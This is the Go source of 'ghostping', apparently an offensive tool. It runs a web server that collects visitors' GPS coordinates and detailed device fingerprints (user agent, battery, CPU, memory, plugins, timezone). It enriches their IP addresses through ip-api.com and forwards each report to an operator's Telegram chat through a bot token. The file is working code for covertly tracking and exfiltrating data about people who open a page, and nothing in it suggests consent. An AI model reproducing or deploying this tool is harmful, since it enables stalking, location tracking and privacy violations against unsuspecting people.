package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

type IPInfo struct {
	City    string `json:"city"`
	Country string `json:"country"`
	ISP     string `json:"isp"`
}

type ClientData struct {
	Latitude    float64 `json:"latitude"`
	Longitude   float64 `json:"longitude"`
	UserAgent   string  `json:"userAgent"`
	Language    string  `json:"language"`
	TimeZone    string  `json:"timeZone"`
	ScreenRes   string  `json:"screenRes"`
	DeviceRatio float64 `json:"deviceRatio"`
	Platform    string  `json:"platform"`
	Battery     string  `json:"battery"`
	Connection  string  `json:"connection"`
	CPUCores    int     `json:"cpuCores"`
	MemoryGB    float64 `json:"memoryGB"`
	Cookies     bool    `json:"cookies"`
	Plugins     string  `json:"plugins"`
	TouchPoints int     `json:"touchPoints"`
}

type TelegramMessage struct {
	ChatID                string `json:"chat_id"`
	Text                  string `json:"text"`
	ParseMode             string `json:"parse_mode,omitempty"`
	DisableWebPagePreview bool   `json:"disable_web_page_preview"`
}

var (
	botToken string
	chatID   string
	port     int
	help     bool
	httpCli  *http.Client
)

func init() {
	flag.StringVar(&botToken, "token", "", "Telegram bot token")
	flag.StringVar(&chatID, "chat", "", "Telegram chat ID")
	flag.IntVar(&port, "port", 8088, "Port to run the server")
	flag.BoolVar(&help, "h", false, "Show usage")
	flag.BoolVar(&help, "help", false, "Show usage (alias)")

	httpCli = &http.Client{Timeout: 15 * time.Second}
}

func usage() {
	ascii := `
 @@@@@@@@  @@@  @@@   @@@@@@    @@@@@@   @@@@@@@  @@@@@@@   @@@  @@@  @@@   @@@@@@@@  
@@@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@@  
!@@        @@!  @@@  @@!  @@@  !@@         @@!    @@!  @@@  @@!  @@!@!@@@  !@@        
!@!        !@!  @!@  !@!  @!@  !@!         !@!    !@!  @!@  !@!  !@!!@!@!  !@!        
!@! @!@!@  @!@!@!@!  @!@  !@!  !!@@!!      @!!    @!@@!@!   !!@  @!@ !!@!  !@! @!@!@  
!!! !!@!!  !!!@!!!!  !@!  !!!   !!@!!!     !!!    !!@!!!    !!!  !@!  !!!  !!! !!@!!  
:!!   !!:  !!:  !!!  !!:  !!!       !:!    !!:    !!:       !!:  !!:  !!!  :!!   !!:  
:!:   !::  :!:  !:!  :!:  !:!      !:!     :!:    :!:       :!:  :!:  !:!  :!:   !::  
 ::: ::::  ::   :::  ::::: ::  :::: ::      ::     ::        ::   ::   ::   ::: ::::  
 :: :: :    :   : :   : :  :   :: : :       :      :        :    ::    :    :: :: :  

		 by k4rkarov (v1.0)`
	fmt.Println("\033[32m" + ascii + "\033[0m")
	fmt.Println(`
Usage:
  ghostping [options]

Options:
  -token TOKEN     Telegram bot token (required)
  -chat CHAT_ID    Telegram chat ID (required)
  -port PORT       Port to run the server (default: 8088)
  -h, --help       Show this help message`)
}

func getIPs(r *http.Request) (string, string) {
	ipHeader := r.Header.Get("X-Forwarded-For")
	if ipHeader == "" {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err == nil {
			ipHeader = host
		} else {
			ipHeader = r.RemoteAddr
		}
	}

	var ipv4, ipv6 string
	ips := strings.Split(ipHeader, ",")
	for _, candidate := range ips {
		candidate = strings.TrimSpace(candidate)
		parsed := net.ParseIP(candidate)
		if parsed == nil {
			continue
		}
		if parsed.To4() != nil && ipv4 == "" {
			ipv4 = candidate
		} else if parsed.To16() != nil && ipv6 == "" {
			ipv6 = candidate
		}
	}
	return ipv4, ipv6
}

func enrichIP(ip string) (*IPInfo, error) {
	if ip == "" {
		return &IPInfo{}, nil
	}

	resp, err := httpCli.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var info IPInfo
	if err := json.Unmarshal(body, &info); err != nil {
		return nil, err
	}
	return &info, nil
}

func sendToTelegram(msg TelegramMessage, token string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	jsonMsg, _ := json.Marshal(msg)
	resp, err := httpCli.Post(url, "application/json", bytes.NewBuffer(jsonMsg))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("Telegram API error (%d): %s", resp.StatusCode, string(body))
	}
	return nil
}

func sendLocationHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	body, _ := io.ReadAll(r.Body)
	log.Println("RAW BODY:", string(body))
	r.Body = io.NopCloser(bytes.NewBuffer(body))

	var data ClientData
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		log.Printf("JSON decode error: %v", err)
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	ipv4, ipv6 := getIPs(r)

	ipv4Info, err := enrichIP(ipv4)
	if err != nil {
		log.Printf("Failed to enrich IPv4: %v", err)
		ipv4Info = &IPInfo{}
	}

	ipv6Info, err := enrichIP(ipv6)
	if err != nil {
		log.Printf("Failed to enrich IPv6: %v", err)
		ipv6Info = &IPInfo{}
	}

	mapsURL := fmt.Sprintf("https://www.google.com/maps?q=%f,%f", data.Latitude, data.Longitude)

	message := fmt.Sprintf(
		`📍 Location
Lat: %f
Lon: %f

🌐 Network
IPv4: %s
City: %s
Country: %s
ISP: %s

IPv6: %s
City: %s
Country: %s
ISP: %s

🖥 Device
User-Agent: %s
Language: %s
Timezone: %s
Screen: %s
DPR: %.2f
Platform: %s
Battery: %s
Connection: %s
CPU Cores: %d
Memory: %.1f GB
Cookies Enabled: %t
Plugins: %s
Touch Points: %d

🔗 Maps: %s`,
		data.Latitude, data.Longitude,
		emptyIf(ipv4, "N/A"),
		emptyIf(ipv4Info.City, "N/A"),
		emptyIf(ipv4Info.Country, "N/A"),
		emptyIf(ipv4Info.ISP, "N/A"),
		emptyIf(ipv6, "N/A"),
		emptyIf(ipv6Info.City, "N/A"),
		emptyIf(ipv6Info.Country, "N/A"),
		emptyIf(ipv6Info.ISP, "N/A"),
		data.UserAgent,
		data.Language,
		data.TimeZone,
		data.ScreenRes,
		data.DeviceRatio,
		data.Platform,
		data.Battery,
		data.Connection,
		data.CPUCores,
		data.MemoryGB,
		data.Cookies,
		data.Plugins,
		data.TouchPoints,
		mapsURL,
	)

	msg := TelegramMessage{
		ChatID:                chatID,
		Text:                  message,
		DisableWebPagePreview: true,
	}

	if err := sendToTelegram(msg, botToken); err != nil {
		log.Printf("Error sending to Telegram: %v", err)
		http.Error(w, "Failed to send message to Telegram", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"success": true}`))
}

func emptyIf(val, def string) string {
	if strings.TrimSpace(val) == "" {
		return def
	}
	return val
}

func main() {
	flag.Parse()

	if len(os.Args) == 1 {
		fmt.Println("Error: no parameters provided")
		usage()
		os.Exit(1)
	}

	if help {
		usage()
		os.Exit(0)
	}

	if botToken == "" || chatID == "" {
		fmt.Println("Error: -token and -chat are required")
		usage()
		os.Exit(1)
	}

	http.Handle("/", http.FileServer(http.Dir("public")))
	http.HandleFunc("/send-location", sendLocationHandler)

	addr := fmt.Sprintf("0.0.0.0:%d", port)
	log.Printf("Server running on port %d...", port)
	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
